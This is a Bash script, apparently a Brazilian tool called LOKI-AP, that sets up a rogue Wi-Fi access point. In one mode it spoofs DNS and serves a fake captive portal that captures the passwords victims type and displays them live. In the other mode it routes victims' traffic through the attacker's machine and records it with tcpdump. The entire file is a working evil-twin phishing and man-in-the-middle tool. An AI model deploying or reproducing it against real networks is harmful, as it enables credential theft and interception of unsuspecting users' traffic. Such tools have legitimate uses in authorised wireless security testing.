#!/bin/bash

# =========================================================================== #
# ============================= < PARAMETROS > ============================== #	
# =========================================================================== #
# Caminho das libs
readonly LOKIPath=$(dirname $(readlink -f "$0"))
readonly LOKILibPath="$LOKIPath/lib"
readonly LOKISenhas="$LOKIPath/SenhasCapturadas"
readonly LOKITrafego="$LOKIPath/Trafego"
readonly LOKITmp="/tmp/loki"
readonly LOKINginx="$LOKIPath/nginx"

# =========================================================================== #
# =========================== < Incluindo Libs > ============================ # 
# =========================================================================== #

source "$LOKILibPath/Ajuda.sh"
source "$LOKILibPath/Format.sh"
source "$LOKILibPath/Funcoes.sh"

# =========================================================================== #
# =========================== < Opcoes do Menu > ============================ # 
# =========================================================================== #

iptables-save > "$LOKIPath/iptables_bkp"
mkdir -p /tmp/loki
# opcoes default
gw="192.168.2.1"
rangeip="192.168.2.2,192.168.2.30"
netmsk="255.255.255.0"
iphost="192.168.2.0"
canal=11
essid="FreeWiFI"
kill=0
interface=""
POSITIONAL=()

if [ -z "$*" ]
then
	echo -e "${vermbold}\n\n$0 precisa de argumentos para funcionar, consulte ${verdebold}$0 -h ${vermbold} para consultar o manual.${normal}"
	exit
fi


while [[ $# -gt 0 ]]
do
flag="$1"

	case $flag in
		-g)
		gw="$2"
		shift
		shift
		;;
		-c)
		canal="$2"
		shift
		shift
		;;
		-e)
		essid="$2"
		shift
		shift
		;;
		-i)
		interface="$2"
		shift
		shift
		;;
		-r)
		rangeip="$2"
		shift
		shift
		;;
		-p)
		portal="$2"
		shift
		shift
		;;
		-n)
		netmsk="$2"
		shift
		shift
		;;
		-b)
		iphost="$2"
		shift
		shift
		;;
		-s)
		spy="$2"
		shift
		shift
		;;
		-w)
		sec="$2"
		shift
		shift
		;;
		-P)
		pass="$2"
		shift
		shift
		;;
		-d)
		dependencias
		exit
		;;
		-k)
		kill=1
		shift
		;;
		-h)
		loki_ajuda
		exit
		;;
		*)
		POSITIONAL+=("$1")
		shift
		;;
	esac
done
set -- "${POSITIONAL[@]}"



# =========================================================================== #
# ======================== < Checando Permissoes > ========================== # 
# =========================================================================== #
usr=$(whoami)

if [ $usr != "root" ]
then
	echo -e "${vermbold}\n\n[-] Necessario privilegio de root para rodar.\n\n${normal}"
	exit
fi

if [ $(iw dev | grep $interface | wc -l) == 0  ]
then
	echo -e "\n\n${vermbold}\n[-] Interface $interface inexistente, favor declarar uma interface valida.${normal}"
	exit
fi

if [ -z "$portal" ] && [ -z "$spy" ]
then
	echo -e "\n\n${azulbold}E necessario escolher entre um modo de ataque, ${verdebold} -p <opcao> para captive portal ou -s <interface> para MITM.\n\n${normal}"
	exit
fi

if [ "$sec" -gt 1 ] && [ -z "$pass" ]
then
	echo -e "\n\n${azulbold}Ao utilizar WAP2, uma senha deve ser informada com ${verdebold}-P <senha>"
	exit
fi


# =========================================================================== #
# ======================== < Iniciando Processos > ========================== # 
# =========================================================================== #

clear

echo -ne "${verde}\n\n"

banner=()

banner+=("██╗░░░░░░█████╗░██╗░░██╗██╗░░░░░░░█████╗░██████╗░\n")

banner+=("██║░░░░░██╔══██╗██║░██╔╝██║░░░░░░██╔══██╗██╔══██╗\n")

banner+=("██║░░░░░██║░░██║█████═╝░██║█████╗███████║██████╔╝\n")

banner+=("██║░░░░░██║░░██║██╔═██╗░██║╚════╝██╔══██║██╔═══╝░\n")

banner+=("███████╗╚█████╔╝██║░╚██╗██║░░░░░░██║░░██║██║░░░░░\n")

banner+=("╚══════╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░░╚═╝░░╚═╝╚═╝░░░░░\n")

for linha in "${banner[@]}"
do
	centralizado $linha
	sleep 0.05
done

echo -ne "${normal}\n\n"

# =========================================================================== #
# ===================== < Verificando dependencias > ======================== # 
# =========================================================================== #

dep=()
centralizado "${verde} Verificando dependencias.."
echo -e "\n\n"
for lin in $(cat $LOKILibPath/dependencias)
do
	if [ $(dpkg --get-selections | grep $lin | wc -l) == 0 ]
	then
		echo -e "${vermbold}[-] ${normal}$lin nao instalado.${normal}"
                dep+=($lin)
	else
                echo -e "${azulbold}[+] ${normal}$lin instalado${normal}"
         fi
done
sleep 0.5
if [ ! -z "$dep" ]
then
	echo -e "\n${vermbold}Existem pacotes a serem instalados."
	echo -e  "${vermbold}Para prosseguir, execute ${verdebold} $0 -d ${normal}\n\n"
	exit
else
        echo -e "\n"
fi
centralizado "${azulbold}[+] Todas as dependencias ja estao instaladas.${normal}\n\n"

if [ "$kill" == 1 ]
then
	wpa=$(ps -e | grep wpa_supplicant | awk '{print $1}')
	nm=$(ps -e | grep NetworkManager | awk '{print $1}')
	if [ ! -z "$wpa" ]
	then
		centralizado "${vermbold}[-] Matando o processo: wpa_supplicant.${normal}\n"
		kill $wpa
	fi
	if [ ! -z "$nm" ]
	then
		centralizado "${vermbold}[-] Matando o processo: NetworkManager.${normal}\n"
		kill $nm
	fi
fi

echo -e "\n"




echo -e "${verdebold}[+] Iniciando interface $interface em modo de monitoramento...${normal}"
ip link set $interface down
sleep 3
iw $interface set monitor control
sleep 3
ip link set $interface up
sleep 5
dnsmaskproc=$(netstat -plnt | grep dnsmasq | awk '{print $7}' | cut -d "/" -f1 | uniq)
if [ ! -z "$dnsmaskproc" ]
then
	kill $dnsmaskproc
fi
echo -e "${verdebold}[+] Configurando AP...${normal}"
sleep 2
echo -e "interface=$interface\ndriver=nl80211\nssid=$essid\nhw_mode=g\nchannel=$canal\nmacaddr_acl=0\nignore_broadcast_ssid=0" > $LOKITmp/hostapd.conf

if [ "$sec" == 2 ]
then
	echo -e "\nauth_algs=1\nwpa=$sec\nwpa_passphrase=$pass\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP" >> $LOKITmp/hostapd.conf
elif [ "$sec" == 3 ]
then
	echo -e "\nauth_algs=1\nwpa=$sec\nwpa_passphrase=$pass\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP" >> $LOKITmp/hostapd.conf
fi

service hostapd stop

xterm -title "Conexoes" -hold -geometry 96x24+0+0 -e hostapd $LOKITmp/hostapd.conf &
echo -e "${verdebold}[+] Configurando DNS...${normal}"
sleep 2

if [ ! -z "$spy" ]
then
	echo -e "interface=$interface\ndhcp-range=$rangeip,$netmsk,12h\ndhcp-option=3,$gw\ndhcp-option=6,$gw\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1" > $LOKITmp/dnsmasq.conf
else
	echo -e "interface=$interface\naddress=/#/$gw\ndhcp-range=$rangeip,$netmsk,12h\ndhcp-option=3,$gw\ndhcp-option=6,$gw\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1" > $LOKITmp/dnsmasq.conf
fi

xterm -title "Spoofing de DNS" -hold -geometry 96x24-0+0 -e dnsmasq -C $LOKITmp/dnsmasq.conf -d &

echo -e "${verdebold}[+] Subindo AP...${normal}"
ifconfig $interface up $gw netmask $netmsk
route add -net $iphost netmask $netmsk gw $gw

if [ -z "$spy" ]
then
	rm -rf /var/www/captive_loki/*
	mkdir -p /var/www/captive_loki

	portalcap=$(cat captive.conf | grep $portal | cut -d "=" -f2)
	unzip -qq $LOKIPath/captive_portal/$portalcap -d /var/www/captive_loki/

	chmod 777 -R /var/www/captive_loki
	service php7.4-fpm restart

	#cria um arquivo de configuração do nginx
	mv /etc/nginx/sites-enabled/* $LOKINginx/ 2> /dev/null
	echo -e "server{\n	listen 80 default_server;\n	listen [::]:80 default_server;\n	root /var/www/captive_loki;\n		index index.php index.html index.htm;\n\n	location / {\n			if (!-f \$request_filename){\n				return 302 \$scheme://$gw/index.html;\n			}\n			try_files \$uri \$uri/ /index.php?args;\n	}\n			location ~ \\.php$ {\n				include snippets/fastcgi-php.conf;\n				fastcgi_pass unix:/run/php/php7.4-fpm.sock;\n				fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;\n			}\n}" > captive
	cp captive /etc/nginx/sites-enabled/captive_loki
	service nginx restart
	service nginx reload
fi

sleep 2
echo -e "${verdebold}[+] Configurando iptables...${normal}\n"

if [ ! -z "$spy" ]
then
	iptables --table nat --append POSTROUTING --out-interface $spy -j MASQUERADE
else
	iptables --table nat --append POSTROUTING --out-interface $interface -j MASQUERADE
fi

iptables --append FORWARD --in-interface $interface -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 2

if [ -z "$spy" ]
then
	echo -e "${verdebold}\n[+] AP criado com o nome de ${azulbold}$essid ${verdebold}no canal ${azulbold}$canal${verdebold}, as senhas serao salvas no arquivo abaixo e poderao ser consultadas apos o encerramento do programa:\n${azulbold}$LOKISenhas/senhas.$essid.txt\n${normal}\n"
	echo -e "${verdebold}Para encerrar pressione Ctrl+C\n${normal}"
	xterm -title "Monitoramento de credenciais" -hold -geometry 96x24+0-0 -e 'echo -e "${azulbold}[+] AP criado, acompanhe abaixo as senhas capturadas:${normal}\n";tail -f /var/www/captive_loki/senhas.txt'
else
	echo -e "${verdebold}\n[+] AP criado com o nome de ${azulbold}$essid ${verdebold}no canal ${azulbold}$canal${verdebold}, a opcao de ataque MITM foi ativada, o arquivo de monitoramento sera salvo no caminho::\n${azulbold}$LOKITrafego/$essid.pcap\n${normal}\n"
	echo -e "${verdebold}Para encerrar pressione Ctrl+C\n${normal}"

	tcpdump -i $interface -w  $LOKITrafego/$essid.pcap 2> /dev/null

fi


trap loki_encerrar EXIT

# =========================================================================== #
# ====================== < Finalizando a aplicacao > ======================== # 
# =========================================================================== #




loki_encerrar(){
        for pid in $(ps -e | egrep "hostapd|dnsmasq|xterm" | awk '{print $1}');
        do
                kill $pid
        done

	echo -e "${verdebold}\n[+] Encerrando modo de monitoramento da interface $interface${normal}"
        ip link set $interface down 
        sleep 3
        iw $interface set type managed
	sleep 3
	ip link set $interface up

	service nginx stop

	if [ -z "$spy" ]
	then
		cat /var/www/captive_loki/senhas.txt > $LOKISenhas/senhas.$essid.txt 2> /dev/null
		rm -f /etc/nginx/sites-enabled/captive_loki 2> /dev/null
		mv $LOKINginx/* /etc/nginx/sites-enabled 2> /dev/null
	fi

	echo -e "${verdebold}[+] Subindo NetworkManager${normal}"
	service NetworkManager restart
	sleep 5
	echo -e "${verdebold}[+] Subindo wpa_supplicant${normal}"
	service wpa_supplicant restart

	echo -e "${verdebold}[+] Limpando iptables${normal}\n\n"

	if [ -f "$LOKIPath/iptables_bkp" ]
	then
		iptables-restore < "$LOKIPath/iptables_bkp"
	else
		iptables --flush
		iptables --table nat --flush
		iptables --delete-chain
		iptables --table nat --delete-chain
	fi

	rm -rf $LOKITmp

	echo 0 > /proc/sys/net/ipv4/ip_forward

	echo -e "${azulbold}MUITO OBRIGADO POR UTILIZAR O LOKI-AP${normal}"
	sleep 0.05
}





